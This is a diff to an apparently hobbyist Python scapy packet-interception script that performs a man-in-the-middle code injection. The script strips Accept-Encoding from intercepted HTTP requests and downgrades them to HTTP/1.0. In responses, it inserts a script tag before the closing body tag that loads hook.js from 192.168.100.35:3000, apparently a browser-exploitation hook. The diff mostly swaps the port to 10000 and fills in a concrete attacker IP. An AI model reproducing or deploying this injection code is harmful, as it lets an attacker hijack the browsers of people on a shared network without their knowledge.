@@ -21,16 +21,17 @@ def spoofed_packet(packets):
     if scapy_packet.haslayer(scapy.Raw):
         scapy_loader = scapy_packet[scapy.Raw].load
         # Destination Port
-        if scapy_packet[scapy.TCP].dport == 80:
+        if scapy_packet[scapy.TCP].dport == 10000:
             print("[+] Request")
+            scapy_loader = regex.sub("Accept-Encoding:.*?\\r\\n", "", scapy_loader)
+            scapy_loader = scapy_loader.replace("HTTP/1.1", "HTTP/1.0")
             # Removing Accept-Encoding in the request using regex rules.
             # The old packet will be returned as a string
             # Thus it will decode the response into HTML code
-            scapy_loader = regex.sub("Accept-Encoding:.*?\\r\\n", "", scapy_loader)
         # Source Port
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[scapy.TCP].sport == 10000 :
             print("[+] Response")
-            code_injection = '<script src="http://<IP>:3000/hook.js"></script>'
+            code_injection = '<script src="http://192.168.100.35:3000/hook.js"></script>'
             # Injecting HTML/JavaScript Code in the response field aka the html code of the website
             scapy_loader = scapy_loader.replace("</body>", code_injection + "</body>")
             search_content_length = regex.search("(?:Content-Length:\s)(\d*)", scapy_loader)
